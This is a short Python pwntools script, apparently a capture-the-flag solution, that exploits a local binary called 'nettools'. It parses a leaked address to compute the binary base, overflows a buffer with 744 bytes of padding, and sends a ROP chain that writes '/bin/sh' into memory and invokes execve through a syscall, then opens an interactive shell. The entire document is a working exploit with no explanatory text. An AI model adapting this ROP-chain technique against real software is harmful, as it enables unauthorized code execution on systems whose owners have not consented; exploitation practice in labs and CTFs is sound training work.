#!/usr/bin/python3
from pwn import process, p64

shell = process("./nettools")

shell.recvuntil(b"leaked: ")
binary_base = int(shell.recvline().strip(), 16) - 0x7a03c

offset = 744
junk = b"\x00".ljust(offset, b"A")

payload  = b""
payload += junk
payload += p64(binary_base + 0x0a0ef) # pop rdi; ret;
payload += p64(binary_base + 0x7a000) # .data
payload += p64(binary_base + 0x09c18) # pop rsi; ret;
payload += b"/bin/sh\x00"             # pathname
payload += p64(binary_base + 0x57ec7) # mov qword ptr [rdi], rsi; ret;
payload += p64(binary_base + 0x09c18) # pop rsi; ret;
payload += p64(0x0)                   # argv = NULL
payload += p64(binary_base + 0x5f28e) # mov rdx, rsi; ret;
payload += p64(binary_base + 0x0ecaa) # pop rax; ret;
payload += p64(0x3b)                  # execve()
payload += p64(binary_base + 0x25adf) # syscall;

shell.sendlineafter(b"> ", b"3")
shell.sendlineafter(b": ", payload)

shell.recvline()
shell.interactive()
